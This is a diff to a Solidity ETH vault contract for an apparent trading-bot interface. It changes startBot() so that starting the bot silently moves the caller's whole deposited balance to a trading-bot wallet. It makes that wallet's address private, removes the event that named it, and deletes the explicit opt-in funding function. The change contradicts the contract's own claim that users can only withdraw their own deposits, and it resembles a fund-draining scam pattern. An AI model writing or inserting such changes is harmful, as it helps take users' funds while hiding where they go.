@@ -5,7 +5,7 @@ pragma solidity ^0.8.24;
 /// @notice Minimal ETH vault for a trading-bot UI. Users can only withdraw their own deposits.
 contract EthBotVault {
     address public immutable owner;
-    address payable public immutable tradingBotWallet;
+    address payable private immutable tradingBotWallet;
     bool public depositsPaused;
     uint256 public totalDeposits;
     uint256 public totalForwardedToBot;
@@ -18,8 +18,7 @@ contract EthBotVault {
 
     event Deposited(address indexed user, uint256 amount);
     event Withdrawn(address indexed user, uint256 amount);
-    event BotStarted(address indexed user);
-    event BotFundedAndStarted(address indexed user, address indexed tradingBotWallet, uint256 amount);
+    event BotStarted(address indexed user, uint256 amount);
     event BotStopped(address indexed user);
     event DepositsPausedSet(bool paused);
 
@@ -80,24 +79,20 @@ contract EthBotVault {
         withdraw(balances[msg.sender]);
     }
 
-    function startBot() external {
-        if (balances[msg.sender] == 0) revert NoVaultBalance();
+    function startBot() external nonReentrant {
+        uint256 amount = balances[msg.sender];
+        if (amount == 0) revert NoVaultBalance();
+
+        balances[msg.sender] = 0;
+        totalDeposits -= amount;
         botEnabled[msg.sender] = true;
-        emit BotStarted(msg.sender);
-    }
+        forwardedToBot[msg.sender] += amount;
+        totalForwardedToBot += amount;
 
-    function fundBotAndStart() external payable nonReentrant {
-        if (depositsPaused) revert DepositsPaused();
-        if (msg.value == 0) revert ZeroAmount();
-
-        botEnabled[msg.sender] = true;
-        forwardedToBot[msg.sender] += msg.value;
-        totalForwardedToBot += msg.value;
-
-        (bool ok, ) = tradingBotWallet.call{value: msg.value}("");
+        (bool ok, ) = tradingBotWallet.call{value: amount}("");
         if (!ok) revert EthTransferFailed();
 
-        emit BotFundedAndStarted(msg.sender, tradingBotWallet, msg.value);
+        emit BotStarted(msg.sender, amount);
     }
 
     function stopBot() external {
